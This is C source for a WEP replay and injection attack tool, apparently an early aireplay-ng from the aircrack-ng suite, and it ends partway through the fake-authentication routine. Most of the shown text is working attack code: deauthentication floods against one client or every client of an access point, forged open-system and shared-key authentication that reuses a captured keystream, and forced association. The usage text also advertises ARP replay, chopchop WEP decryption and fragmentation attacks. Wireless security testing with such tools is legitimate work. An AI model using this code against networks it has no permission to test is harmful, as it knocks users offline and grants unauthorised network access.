/*
 *  802.11 WEP replay & injection attacks
 *
 *  Copyright (C) 2006 Thomas d'Otreppe
 *  Copyright (C) 2004,2005 Christophe Devine
 *
 *  WEP decryption attack (chopchop) developped by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#ifndef linux
	#error Aireplay-ng only compiles with Linux
#endif

#include <linux/rtc.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include "version.h"
#include "pcap.h"

#define NULL_MAC        "\x00\x00\x00\x00\x00\x00"
#define BROADCAST       "\xFF\xFF\xFF\xFF\xFF\xFF"
#define SPANTREE        "\x01\x80\xC2\x00\x00\x00"

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

#define NEW_IV  1
#define RETRY   2
#define ABORT   3

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev);
extern int is_ndiswrapper(const char * iface, const char * path);
extern char * searchInside(const char * dir, const char * filename);
extern char * wiToolsPath(const char * tool);
extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
extern int check_crc_buf( unsigned char *buf, int len );

extern const unsigned long int crc_tbl[256];
extern const unsigned char crc_chop_tbl[256][4];


char usage[] =

"\n"
"  %s - (C) 2006 Thomas d\'Otreppe\n"
"  Original work: Christophe Devine\n"
"  http://www.aircrack-ng.org\n"
"\n"
"  usage: aireplay-ng <options> <replay interface>\n"
"\n"
"  filter options:\n"
"\n"
"      -b bssid  : MAC address, Access Point\n"
"      -d dmac   : MAC address, Destination\n"
"      -s smac   : MAC address, Source\n"
"      -m len    : minimum packet length\n"
"      -n len    : maximum packet length\n"
"      -u type   : frame control, type    field\n"
"      -v subt   : frame control, subtype field\n"
"      -t tods   : frame control, To      DS bit\n"
"      -f fromds : frame control, From    DS bit\n"
"      -w iswep  : frame control, WEP     bit\n"
"\n"
"  replay options:\n"
"\n"
"      -x nbpps  : number of packets per second\n"
"      -p fctrl  : set frame control word (hex)\n"
"      -a bssid  : set Access Point MAC address\n"
"      -c dmac   : set Destination  MAC address\n"
"      -h smac   : set Source       MAC address\n"
"      -e essid  : fakeauth  attack : set target AP SSID\n"
"      -j        : arpreplay attack : inject FromDS pkts\n"
"      -g value  : change ring buffer size (default: 8)\n"
"      -k IP     : set destination IP in fragments\n"
"      -l IP     : set source IP in fragments\n"
"      -o npckts : number of packets per burst (-1)\n"
"      -q sec    : seconds between keep-alives (-1)\n"
"      -y prga   : keystream for shared key auth\n"
/*
"\n"
"  WIDS evasion options:\n"
"      -y value  : Use packets older than n packets\n"
"      -z        : Ghosting\n"
*/
"\n"
"  source options:\n"
"\n"
"      -i iface  : capture packets from this interface\n"
"      -r file   : extract packets from this pcap file\n"
"\n"
"  attack modes (Numbers can still be used):\n"
"\n"
"      --deauth      count : deauthenticate 1 or all stations (-0)\n"
"      --fakeauth    delay : fake authentication with AP (-1)\n"
"      --interactive       : interactive frame selection (-2)\n"
"      --arpreplay         : standard ARP-request replay (-3)\n"
"      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
"      --fragment          : generates valid keystream   (-5)\n"
"\n";

struct options
{
    unsigned char f_bssid[6];
    unsigned char f_dmac[6];
    unsigned char f_smac[6];
    int f_minlen;
    int f_maxlen;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    int r_nbpps;
    int r_fctrl;
    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];
    unsigned char r_dip[4];
    unsigned char r_sip[4];
    char r_essid[33];
    int r_fromdsinj;

    char *s_face;
    char *s_file;
    uchar *prga;

    int a_mode;
    int a_count;
    int a_delay;

    int ringbuffer;
    int ghost;
    int prgalen;

    int delay;
    int npackets;
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    uchar mac_in[6];
    uchar mac_out[6];

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

struct ARP_req
{
    unsigned char *buf;
    int len;
};

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

uchar ska_auth1[]     = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";

uchar ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xc0\x01";


int ctrl_c, alarmed;

char * iwpriv;


void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

/* wlanng-aware frame sending routing */

int send_packet( void *buf, size_t count )
{
    int ret;

    if( dev.is_wlanng && count >= 24 )
    {
        /* for some reason, wlan-ng requires a special header */

        if( ( ((unsigned char *) buf)[0] & 3 ) != 3 )
        {
            memcpy( tmpbuf, buf, 24 );
            memset( tmpbuf + 24, 0, 22 );

            tmpbuf[30] = ( count - 24 ) & 0xFF;
            tmpbuf[31] = ( count - 24 ) >> 8;

            memcpy( tmpbuf + 46, buf + 24, count - 24 );

            count += 22;
        }
        else
        {
            memcpy( tmpbuf, buf, 30 );
            memset( tmpbuf + 30, 0, 16 );

            tmpbuf[30] = ( count - 30 ) & 0xFF;
            tmpbuf[31] = ( count - 30 ) >> 8;

            memcpy( tmpbuf + 46, buf + 30, count - 30 );

            count += 16;
        }

        buf = tmpbuf;
    }

    if( ( dev.is_wlanng || dev.is_hostap ) &&
        ( ((uchar *) buf)[1] & 3 ) == 2 )
    {
        unsigned char maddr[6];

        /* Prism2 firmware swaps the dmac and smac in FromDS packets */

        memcpy( maddr, buf + 4, 6 );
        memcpy( buf + 4, buf + 16, 6 );
        memcpy( buf + 16, maddr, 6 );
    }

    ret = write( dev.fd_out, buf, count );

    if( ret < 0 )
    {
        if( errno == EAGAIN || errno == EWOULDBLOCK ||
            errno == ENOBUFS )
        {
            usleep( 10000 );
            return( 0 );
        }

        perror( "write failed" );
        return( -1 );
    }

    nb_pkt_sent++;
    return( 0 );
}

/* madwifi-aware frame reading routing */

int read_packet( void *buf, size_t count )
{
    int caplen, n = 0;

    if( ( caplen = read( dev.fd_in, tmpbuf, count ) ) < 0 )
    {
        if( errno == EAGAIN )
            return( 0 );

        perror( "read failed" );
        return( -1 );
    }

    if( dev.is_madwifi && !(dev.is_madwifing) )
        caplen -= 4;    /* remove the FCS */

    memset( buf, 0, sizeof( buf ) );

    if( dev.arptype_in == ARPHRD_IEEE80211_PRISM )
    {
        /* skip the prism header */

        if( tmpbuf[7] == 0x40 )
            n = 64;
        else
            n = *(int *)( tmpbuf + 4 );

        if( n < 8 || n >= caplen )
            return( 0 );
    }

    if( dev.arptype_in == ARPHRD_IEEE80211_FULL )
    {
        /* skip the radiotap header */

        n = *(unsigned short *)( tmpbuf + 2 );

        if( n <= 0 || n >= caplen )
            return( 0 );
    }

    caplen -= n;

    memcpy( buf, tmpbuf + n, caplen );

    return( caplen );
}

void read_sleep( int usec )
{
    struct timeval tv, tv2, tv3;
    int caplen;
    fd_set rfds;

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);

    tv3.tv_sec=0;
    tv3.tv_usec=10000;

    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
        {
            continue;
        }

        if( FD_ISSET( dev.fd_in, &rfds ) )
            caplen = read_packet( h80211, sizeof( h80211 ) );

        gettimeofday(&tv2, NULL);
    }
}


int filter_packet( unsigned char *h80211, int caplen )
{
    int z, mi_b, mi_s, mi_d;

    /* check length */

    if( caplen < opt.f_minlen ||
        caplen > opt.f_maxlen ) return( 1 );

    /* check the frame control bytes */

    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&
        opt.f_type    >= 0 ) return( 1 );

    if( ( h80211[0] & 0xF0 ) != ( opt.f_subtype << 4 ) &&
        opt.f_subtype >= 0 ) return( 1 );

    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&
        opt.f_tods    >= 0 ) return( 1 );

    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&
        opt.f_fromds  >= 0 ) return( 1 );

    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&
        opt.f_iswep   >= 0 ) return( 1 );

    /* check the extended IV (TKIP) flag */

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

    if( opt.f_type == 2 && opt.f_iswep == 1 &&
        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );

    /* MAC address checking */

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b =  4; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )
            return( 1 );

    /* this one looks good */

    return( 0 );
}


#define PCT { struct tm *lt; time_t tc = time( NULL ); \
              lt = localtime( &tc ); printf( "%02d:%02d:%02d  ", \
              lt->tm_hour, lt->tm_min, lt->tm_sec ); }

int do_attack_deauth( void )
{
    int i, n;

    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-a).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
        printf( "NB: this attack is more effective when targeting\n"
                "a connected wireless client (-c <client's mac>).\n" );

    n = 0;

    while( 1 )
    {
        if( opt.a_count > 0 && ++n > opt.a_count )
            break;

        usleep( 180000 );

        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
        {
            /* deauthenticate the target */

            PCT; printf( "Sending DeAuth to station   -- STMAC:"
                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                         opt.r_dmac[0],  opt.r_dmac[1],
                         opt.r_dmac[2],  opt.r_dmac[3],
                         opt.r_dmac[4],  opt.r_dmac[5] );

            memcpy( h80211, DEAUTH_REQ, 26 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            for( i = 0; i < 64; i++ )
            {
                memcpy( h80211 +  4, opt.r_dmac,  6 );
                memcpy( h80211 + 10, opt.r_bssid, 6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );

                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_dmac,  6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );
            }
        }
        else
        {
            /* deauthenticate all stations */

            PCT; printf( "Sending DeAuth to broadcast -- BSSID:"
                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                         opt.r_bssid[0], opt.r_bssid[1],
                         opt.r_bssid[2], opt.r_bssid[3],
                         opt.r_bssid[4], opt.r_bssid[5] );

            memcpy( h80211, DEAUTH_REQ, 26 );

            memcpy( h80211 +  4, BROADCAST,   6 );
            memcpy( h80211 + 10, opt.r_bssid, 6 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            for( i = 0; i < 128; i++ )
            {
                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );
            }
        }
    }

    return( 0 );
}

int read_prga(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    opt.prgalen = size;

    fclose(f);
    return( 0 );
}

void wait_for_beacon(uchar *bssid, uchar *capa)
{
    int len = 0;
    uchar pkt_sniff[4096];

    while (1) {
	len = 0;
	while (len < 22) len = read_packet(pkt_sniff, 4096);
	if (! memcmp(pkt_sniff, "\x80", 1)) {
	    if (! memcmp(bssid, pkt_sniff+10, 6)) break;
	}
    }

    memcpy(capa, pkt_sniff+34, 2);

}

void add_icv(uchar *input, int len, int offset)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = offset; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

int xor_keystream(uchar *ph80211, uchar *keystream, int len)
{
    int i=0;

    for (i=0; i<len; i++) {
        ph80211[i] = ph80211[i] ^ keystream[i];
    }

    return 0;
}

int fake_ska_auth_1( void )
{
    int caplen=0;
    int tmplen=0;
    int got_one=0;

    char sniff[4096];

    struct timeval tv, tv2;

    uchar ack[14] = 	"\xd4";
    memset(ack+1, 0, 13);

    memcpy(ska_auth1+4, opt.r_bssid, 6);
    memcpy(ska_auth1+10,opt.r_smac,  6);
    memcpy(ska_auth1+16,opt.r_bssid, 6);

    //Preparing ACK packet
    memcpy(ack+4, opt.r_bssid, 6);

    send_packet(ska_auth1, 30);
    send_packet(ack, 14);

    printf("Part1: Authentication\n");

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);
    got_one = 0;
    //Waiting for response packet containing the challenge
    while (1)
    {
        caplen = read_packet(sniff, 4096);
        if (sniff[0] == '\xb0' && sniff[26] == 2)
        {
            got_one = 1;
            gettimeofday(&tv, NULL);
            memcpy(h80211, sniff, caplen);
            tmplen = caplen;
        }

        gettimeofday( &tv2 ,NULL);
        if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 200*1000 && got_one)
        {
//            memcpy(h80211, tmpbuf, tmplen);
            caplen = tmplen;
            break;
        }

        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000 && !got_one)
        {
            printf ("Not answering...(Step1)\n\n");
            return -1;
        }
    }

    if (sniff[28] == '\x0d')
    {
        printf ("\nAP does not support Shared Key Authentication!\n");
        return -1;
    }

    return caplen;
}

int fake_ska_auth_2(uchar *ph80211, int caplen, uchar *prga, uchar *iv)
{
    struct timeval tv, tv2;
    int ret=0;
    uchar ack[14] = 	"\xd4";
    memset(ack+1, 0, 13);
    uchar packet[4096];

    //Increasing SEQ number
    ph80211[26]++;
    //Adding ICV checksum
    add_icv(ph80211, caplen, 24);
    //ICV => plus 4 bytes
    caplen += 4;

    //Encrypting
    xor_keystream(ph80211+24, prga, caplen-24);

    memcpy(ska_auth3+4, opt.r_bssid, 6);
    memcpy(ska_auth3+10,opt.r_smac,  6);
    memcpy(ska_auth3+16,opt.r_bssid, 6);

    //Calculating size of encrypted packet
    caplen += 4; //Encrypted packet has IV+KeyIndex, thus 4 bytes longer than plaintext with ICV

    //Copy IV and ciphertext into packet
    memcpy(ska_auth3+24, iv, 4);
    memcpy(ska_auth3+28, ph80211+24, caplen-28);

    send_packet(ska_auth3, caplen);
    send_packet(ack, 14);

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);
    //Waiting for successful authentication
    while (1)
    {
        caplen = read_packet(packet, 4096);
        if (packet[0] == 0xb0 && (caplen < 60) && packet[26] == 4) break;

        gettimeofday(&tv2, NULL);
        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
        {
            printf ("\nNot answering...(Step2)\n\n");
            return -1;
        }
    }

    if (!memcmp(packet+24, "\x01\x00\x04\x00\x00\x00", 6))
    {
        printf ("Code 0 - Authentication SUCCESSFUL :)\n");
        ret = 0;
    }
    else
    {
        printf ("\nAuthentication failed!\n\n");
        ret = -1;
    }


    return ret;
}

int fake_asso()
{
    struct timeval tv, tv2;
    int caplen = 0;
    int slen;
    uchar ack[14] = 	"\xd4";
    memset(ack+1, 0, 13);

    uchar assoc[4096] = "\x00\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xd0\x01\x15\x00\x0a\x00\x00";

    uchar rates[16] =   "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C";
    uchar packet[4096];

    uchar *capa;	//Capability Field from beacon

    printf("Part2: Association\n");


    capa = (uchar *) malloc(2);

    //Copying MAC adresses into frame
    memcpy(assoc+4 ,opt.r_bssid,6);
    memcpy(assoc+10,opt.r_smac, 6);
    memcpy(assoc+16,opt.r_bssid,6);

    memcpy(ack+4, opt.r_bssid, 6);

    //Getting ESSID length
    slen = strlen(opt.r_essid);

    //Set tag length
    assoc[29] = (uchar) slen;
    //Set ESSID tag
    memcpy(assoc+30,opt.r_essid,slen);
    //Set Rates tag
    memcpy(assoc+30+slen, rates, 16);

    //Calculating total packet size
    int assoclen = 30 + slen + 16;

    wait_for_beacon(opt.r_bssid, capa);
    memcpy(assoc+24, capa, 2);

    send_packet(assoc, assoclen);
    send_packet(ack, 14);

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);
    while (1)
    {
        caplen = read_packet(packet, 4096);

        if (packet[0] == 0x10) break;

        gettimeofday(&tv2, NULL);
        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
        {
            printf ("\nNot answering...(Step3)\n\n");
            return -1;
        }
    }

    if (!memcmp(packet+26, "\x00\x00", 2))
    {
        printf ("Code 0 - Association SUCCESSFUL :)\n\n");
    }
    else
    {
        printf ("\nAssociation failed!\n\n");
        return -1;
    }

    return 0;
}

int fake_ska(uchar* prga)
{
    uchar *iv;

    int caplen=0;
    int prgalen;
    int ret=-1;
    int i=0;

    while(caplen <= 0)
    {
        caplen = fake_ska_auth_1();
        if(caplen <=0) printf("Retrying 1. auth sequence!\n");
        if(i>50) return -1;
        i++;
    }

    prgalen = opt.prgalen;
    iv = prga;
    prga += 4;

    if (prgalen < caplen-24)
    {
        printf("\n\nPRGA is too short! Need at least %d Bytes, got %d!\n", caplen-24, prgalen);
        return -1;
    }

    memcpy(tmpbuf, h80211, caplen);
    ret = fake_ska_auth_2( tmpbuf, caplen, prga, iv);
    if(ret < 0)return -1;

    i=0;
    ret = -1;
    while(ret < 0)
    {
        ret = fake_asso();
        if(ret < 0) printf("Retrying association sequence!\n");
        if(i>50) return -1;
        i++;
    }

    return 0;
}

int do_attack_fake_auth( void )
{
    time_t tt, tr;
    struct timeval tv;

    fd_set rfds;
    int i, n, state, caplen;
    int mi_b, mi_s, mi_d;
    int x_send;
    int ret;
    int kas;
    int tries;
    int abort;

    unsigned char ackbuf[14];

    if( opt.r_essid[0] == '\0' )
    {
        printf( "Please specify an ESSID (-e).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-a).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
    memcpy( ackbuf +  4, opt.r_bssid, 6 );
    memset( ackbuf + 10, 0, 4 );

    tries = 0;
    abort = 0;
    state = 0;
    x_send = 4;
    if(opt.npackets > 0) x_send = opt.npackets;
    tt = time( NULL );
    tr = time( NULL );

    while( 1 )
    {
        switch( state )
        {
            case 0:

                state = 1;
                tt = time( NULL );

                /* attempt to authenticate */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                PCT; printf( "Sending Authentication Request\n" );

                for( i = 0; i < x_send; i++ )
                {
                    if( send_packet( h80211, 30 ) < 0 )
                        return( 1 );

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 1:

                /* waiting for an authentication response */

                if( time( NULL ) - tt >= 2 )
                {
                    if(opt.npackets > 0)
                    {
                        tries++;

                        if( tries > 15  )
                        {
                            abort = 1;
                        }
                    }
                    else
                    {
                        if( x_send < 256 )
                        {
                            x_send *= 2;
                        }
                        else
                        {
                            abort = 1;
                        }
                    }

                    if( abort )
                    {
                        printf(
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver hasn't been patched for injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * Injection is not supported AT ALL on HermesI,\n"
    "      Centrino, ndiswrapper and a few others chipsets.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate (iwconfig <iface> rate 1M).\n\n" );
                        return( 1 );
                    }

                    state = 0;
                }

                break;

            case 2:

                tries = 0;
                state = 3;
                if(opt.npackets == -1) x_send *= 2;
                tt = time( NULL );

                /* attempt to associate */

                memcpy( h80211, ASSOC_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[28] = 0x00;
                h80211[29] = n;

                memcpy( h80211 + 30, opt.r_essid,  n );
                memcpy( h80211 + 30 + n, RATES, 16 );

                PCT; printf( "Sending Association Request\n" );

                for( i = 0; i < x_send; i++ )
                {
                    if( send_packet( h80211, 46 + n ) < 0 )
                        return( 1 );

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 3:

                /* waiting for an association response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 && (opt.npackets == -1) )
                        x_send *= 4;

                    state = 0;
                }

                break;

            case 4:

                if( opt.a_delay == 0 )
                    return( 0 );

                if( time( NULL ) - tt >= opt.a_delay )
                {
                    if(opt.npackets == -1) x_send = 4;
                    state = 0;
                    break;
                }

                if( time( NULL ) - tr >= opt.delay )
                {
                    tr = time( NULL );

                    PCT; printf( "Sending keep-alive packet\n" );

                    memcpy( h80211, NULL_DATA, 24 );
                    memcpy( h80211 +  4, opt.r_bssid, 6 );
                    memcpy( h80211 + 10, opt.r_smac,  6 );
                    memcpy( h80211 + 16, opt.r_bssid, 6 );

                    if( opt.npackets > 0 ) kas = opt.npackets;
                    else kas = 32;

                    for( i = 0; i < kas; i++ )
                        if( send_packet( h80211, 24 ) < 0 )
                            return( 1 );
                }

                break;

            default: break;
        }

        /* read one frame */

        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        tv.tv_sec  = 1;
        tv.tv_usec = 0;

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
        {
            if( errno == EINTR ) continue;
            perror( "select failed" );
            return( 1 );
        }

        if( ! FD_ISSET( dev.fd_in, &rfds ) )
            continue;

        caplen = read_packet( h80211, sizeof( h80211 ) );

        if( caplen  < 0 ) return( 1 );
        if( caplen == 0 ) continue;

        if( caplen < 24 )
            continue;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b =  4; mi_d = 16; mi_s = 24; break;
        }

        /* check if the dest. MAC is ours and source == AP */

        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
        {
            /* check if we got an deauthentication packet */

            if( h80211[0] == 0xC0 && state == 4 )
            {
                PCT; printf( "Got a deauthentication packet!\n" );
                if(opt.npackets == -1) x_send = 4;
                state = 0;
                sleep( 3 );
                continue;
            }

            /* check if we got an disassociation packet */

            if( h80211[0] == 0xA0 && state == 4 )
            {
                PCT; printf( "Got a disassociation packet!\n" );
                if(opt.npackets == -1) x_send = 4;
                state = 0;
                sleep( 3 );
                continue;
            }

            /* check if we got an authentication response */

            if( h80211[0] == 0xB0 && state == 1 )
            {
                state = 0; PCT;

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    continue;
                }

                if( h80211[24] != 0 || h80211[25] != 0 )
                {
                    printf( "FATAL: algorithm != Open System (0)\n" );

                    if(opt.prgalen == 0)
                    {
                        printf( "Please specify a PRGA-file (-y).\n" );
                        return -1;
                    }

                    sleep(2);
                    i=0;
                    while(1)
                    {
                        ret = fake_ska(opt.prga);
                        if(ret == 0)
                        {
                            i=0;
                            if(opt.a_delay > 0 ) sleep(opt.a_delay);
                            else return(0);
                        }
                        else
                        {
                            i++;
                            if(i>10)
                            {
                                printf("Authentication failed!\n");
                                return 1;
                            }
                        }
                    }
                    return 0;
                }

                n = h80211[28] + ( h80211[29] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "AP rejects the source MAC address ?\n" );
                        break;

                    case 10:
                        printf( "AP rejects our capabilities\n" );
                        break;

                    case 13:
                    case 15:
                        printf( "AP rejects open-system authentication\n" );

                        if(opt.prgalen == 0)
                        {
                            printf( "Please specify a PRGA-file (-y).\n" );
                            return -1;
                        }

                        sleep(2);
                        i=0;
                        while(1)
                        {
                            ret = fake_ska(opt.prga);
                            if(ret == 0)
                            {
                                i=0;
                                if(opt.a_delay > 0)sleep(opt.a_delay);
                                else return(0);
                            }
                            else
                            {
                                i++;
                                if(i>10)
                                {
                                    printf("Authentication failed!\n");
                                    return 1;
                                }
                            }
                        }
                        return 0;

                    default:
                        break;
                    }

                    PCT; printf( "Authentication failed (code %d)\n", n );
                    if(opt.npackets == -1) x_send = 4;
                    sleep( 3 );
                    continue;
                }

                printf( "Authentication successful\n" );

                state = 2;      /* auth. done */
            }

            /* check if we got an association response */

            if( h80211[0] == 0x10 && state == 3 )
            {
                state = 0; PCT;

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        break;

                    case 10:
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        break;

                    case 12:
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        break;

                    default:
                        printf( "Association denied (code %d)\n", n );
                        break;
                    }

                    sleep( 3 );
                    continue;
                }

